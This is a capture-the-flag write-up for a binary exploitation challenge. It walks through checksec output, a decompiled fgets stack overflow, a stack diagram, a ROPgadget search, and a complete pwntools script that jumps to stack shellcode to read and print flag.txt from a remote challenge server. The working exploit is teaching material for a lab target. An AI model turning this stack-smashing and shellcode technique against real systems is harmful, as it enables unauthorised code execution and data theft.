# Pwn - SimpleOverflow
- Solved by: @Elma
- Flag: **-UNKNOWN-**

## Writeup

We start by looking at the protections of the binary.

```sh
> checksec baby_binary
[*] './baby_binary'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

As we can see, many protections are disabled. Amongst them, NX is disabled which means that our stack will have executable permissions. We will keep this in mind for now.

Throwing the binary into IDA, the vulnerability is straightforward.

```c
int vuln()
{
  char input[112];
  return fgets(input, 256, stdin);
}
```

Even though `checksec` mentions that Canary is enabled in the program, it does not apply to this function as we can see from the code. If there is canary in this function, the decompiled code will contain something like `_readfsqword(0x28)` at the start of the code.

Anyways, we are presented with an easily exploitable buffer overflow. Our function stack will look like this in memory

```
┌───────────────────────┐
│                       │
│       input[112]      │
│                       │
├───────────────────────┤
│                       │
│       saved rbp       │
│                       │
├───────────────────────┤
│                       │
│    return address     │
│                       │
└───────────────────────┘
```

We can overflow from `input` into `return address`, changing the execution flow of the program. In order to solve this, we can write shellcode on the stack and jump to it by using a `jmp rsp` or equivalent gadget.

We can find the gadget by using `ROPgadget`

```sh
> ROPgadget --binary ./baby_binary
# ...
0x0000000000418d92 : push rsp ; ret
# ...
```

From the given Dockerfile, we can also identify that the `flag.txt` file is in the same directory as the program. The docker also uses the `scratch` image, which does not come with any programs, thus we cannot spawn a shell by writing an `execve("/bin/sh")` shellcode.

We will simply write shellcode that **opens the flag file**, then **send the contents of the file to stdout using the `sendfile` syscall**.

```py
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("baby_binary")
if args.REMOTE:
    p = remote('ec2-3-1-204-6.ap-southeast-1.compute.amazonaws.com', 64852)
else:
    p = elf.process()

# payload sent will look like
# b"A"*120 (padding for input + saved rbp)
# + gadget address to jmp to rsp to run shellcode that is pointed by the stack pointer
# + shellcode to be run
p.sendline(fit({
    120: 0x0000000000418d92, # push rsp; ret     <--- this is equiavlent to jmp rsp (can you figure out why?)
    128: asm(shellcraft.open("flag.txt", 0, 0)) + asm(shellcraft.sendfile(1, 3, 0, 100))
}))

p.interactive()
```
